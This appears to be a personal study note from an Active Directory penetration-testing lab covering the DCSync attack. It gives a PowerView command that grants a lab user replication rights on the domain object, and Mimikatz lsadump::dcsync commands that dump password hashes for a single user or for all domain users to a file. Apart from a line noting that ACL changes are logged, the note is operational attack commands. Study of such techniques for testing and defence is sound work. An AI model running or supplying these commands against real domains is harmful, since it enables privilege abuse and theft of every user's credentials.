#mimikatz 
- DC Sync requires only two rights on the domain object.
	- Replicating Directory Changes
	- Replicating Directory Changes All
	- Replicating Directory Changes in Filtered Set (Optional maybe)
- Changes to the ACL of the `domain object` will be logged.

## Replication Rights
We can give our user replication rights, using `powerview.ps1`
```powershell
. .\powerview.ps1
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity studentx -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```
### Mimikatz
- Requires "Domain Admins" privs.
```powershell
# Dump credentails for a single user
lsadump::dcsync /domain:mydomain.local /user:<username>

# Dump credentials of all the domain user
log myfile.txt
lsadump::dcsync /domain:mydomain.local /all
```